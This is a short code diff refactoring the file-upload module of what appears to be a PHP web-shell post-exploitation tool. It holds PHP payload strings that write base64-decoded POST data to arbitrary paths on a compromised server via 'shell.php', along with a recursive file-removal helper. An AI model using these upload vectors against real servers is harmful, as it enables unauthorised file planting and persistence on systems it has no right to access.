@@ -24,25 +24,25 @@ WARN_UPLOAD_FAIL = 'Upload fail, check path and permission'
 class Upload(ModuleProbeAll):
     '''Upload binary/ascii file to the target filesystem'''
 
-
-    vectors = VectorList([
-        Vector('shell.php', 'file_put_contents', [ "file_put_contents('$rpath', base64_decode($_POST['$post_field']), FILE_APPEND);", "-post", "{\'$post_field\' : \'$data\' }" ]),
-        Vector('shell.php', 'fwrite', [ '$h = fopen("$rpath", "a+"); fwrite($h, base64_decode($_POST["$post_field"])); fclose($h);', "-post", "{\'$post_field\' : \'$data\' }" ])
+    def _init_vectors(self):
+        self.vectors = VectorList([
+            Vector('shell.php', 'file_put_contents', [ "file_put_contents('$rpath', base64_decode($_POST['$post_field']), FILE_APPEND);", "-post", "{\'$post_field\' : \'$data\' }" ]),
+            Vector('shell.php', 'fwrite', [ '$h = fopen("$rpath", "a+"); fwrite($h, base64_decode($_POST["$post_field"])); fclose($h);', "-post", "{\'$post_field\' : \'$data\' }" ])
+            ])
+    
+        self.support_vectors = VectorList([
+            Vector('file.rm',  "rm", "$rpath -recursive".split(' ')),
+            Vector('file.check',  "check_exists", "$rpath exists".split(' ')),
+            Vector('file.check', 'md5', '$rpath md5'.split(' ')),
         ])
-
-    support_vectors = VectorList([
-        Vector('file.rm',  "rm", "$rpath -recursive".split(' ')),
-        Vector('file.check',  "check_exists", "$rpath exists".split(' ')),
-        Vector('file.check', 'md5', '$rpath md5'.split(' ')),
-    ])
-
-    argparser = ArgumentParser(usage=__doc__)
-    argparser.add_argument('lpath')
-    argparser.add_argument('rpath')
-    argparser.add_argument('-chunksize', type=int, default=1024)
-    argparser.add_argument('-content', help=SUPPRESS)
-    argparser.add_argument('-vector', choices = vectors.get_names()),
-    argparser.add_argument('-force', action='store_true')
+    
+    def _init_args(self):
+        self.argparser.add_argument('lpath')
+        self.argparser.add_argument('rpath')
+        self.argparser.add_argument('-chunksize', type=int, default=1024)
+        self.argparser.add_argument('-content', help=SUPPRESS)
+        self.argparser.add_argument('-vector', choices = self.vectors.get_names()),
+        self.argparser.add_argument('-force', action='store_true')
 
     def _load_local_file(self):
 
